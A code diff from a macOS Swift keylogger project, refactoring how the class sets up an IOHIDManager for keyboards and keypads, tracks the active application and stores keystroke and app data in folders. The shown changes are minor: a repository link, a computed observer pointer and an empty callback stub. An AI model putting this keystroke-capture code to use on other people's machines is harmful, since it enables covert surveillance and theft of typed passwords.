@@ -5,6 +5,7 @@
 //  Created by Skrew Everything on 14/01/17.
 //  Copyright © 2017 Skrew Everything. All rights reserved.
 //
+//  https://github.com/SkrewEverything/Swift-Keylogger
 
 import Foundation
 import IOKit.hid
@@ -13,12 +14,16 @@ import Cocoa
 class Keylogger
 {
     var manager: IOHIDManager
+//    var observer: UnsafeMutableRawPointer
     var deviceList = NSArray()                  // Used in multiple matching dictionary
     var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
     var appName = ""                            // Active App name
     var appData:URL                             // Folder
     var keyData:URL                             // Folder
     var devicesData:URL                         // Folder
+    var observer:UnsafeMutableRawPointer {
+        return UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
+    }
     
     init()
     {
@@ -32,10 +37,8 @@ class Keylogger
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keypad)) as NSArray
         
         IOHIDManagerSetDeviceMatchingMultiple(manager, deviceList as CFArray)
+
         
-        
-        
-        let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
         
         /* App switching notification*/
         NSWorkspace.shared.notificationCenter.addObserver(self,
@@ -59,6 +62,10 @@ class Keylogger
         
     }
     
+    func setKeydownCallback(callback: IOHIDValueCallback?) {
+        
+    }
+    
     @objc dynamic func activatedApp(notification: NSNotification)
     {
 //        print(notification.userInfo);
@@ -78,7 +85,7 @@ class Keylogger
     }
     
     /* For Keyboard */
-    func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
+    func CreateDeviceMatchingDictionary(inUsagePage: Int , inUsage: Int) -> CFMutableDictionary
     {
         /* // note: the usage is only valid if the usage page is also defined */
         
